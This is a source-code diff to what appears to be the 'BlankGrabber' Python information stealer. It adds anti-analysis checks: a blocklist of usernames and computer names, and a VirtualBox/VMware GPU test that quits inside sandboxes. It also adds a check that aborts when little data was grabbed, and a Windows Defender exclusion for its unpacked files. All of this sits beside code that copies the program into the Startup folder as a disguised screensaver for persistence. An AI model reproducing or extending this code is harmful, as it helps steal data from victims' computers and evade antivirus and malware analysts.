@@ -102,7 +102,7 @@ class vmprotect:
         if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "harry johnson", "j.seance", "a.monaldo", "tvm"]:
             fquit()
 
-        if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "compname_5076", "desktop-vkeons4"]:
+        if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "compname_5076", "desktop-vkeons4", "NTT-EFF-2W11WSS"]:
             fquit()
 
         tasks = force_decode(subprocess.run("tasklist", capture_output= True, shell= True).stdout)
@@ -114,7 +114,7 @@ class vmprotect:
         
         r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
         r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
-        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox"))
+        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
         if (r1.returncode != 1 and r2.returncode != 1) or gpucheck:
             fquit()
         
@@ -199,12 +199,20 @@ class BlankGrabber:
         for t in threads:
             t.join()
         self.errorReport()
+        self.lastCheck()
         self.send()
     
     def errorReport(self):
         if len(_errorlogs):
             with open(os.path.join(self.tempfolder, "Error Logs.txt"), "w") as file:
                 file.write("\n".join(_errorlogs))
+    
+    def lastCheck(self):
+        filescount = 0
+        for _, value in self.grabbed_data.items():
+            filescount += value
+        if filescount < 2:
+            os._exit(1)
 
     @catch
     def webshot(self):
@@ -681,6 +689,7 @@ if __name__ == "__main__":
                     try:
                         exepath = os.path.join("C:/ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp", f"ScreenSaver-{generate()}.scr")
                         wd_exclude(exepath)
+                        wd_exclude(sys._MEIPASS)
                         BlankGrabber.copy("Blank", sys.executable, exepath)
                     except Exception:
                         pass
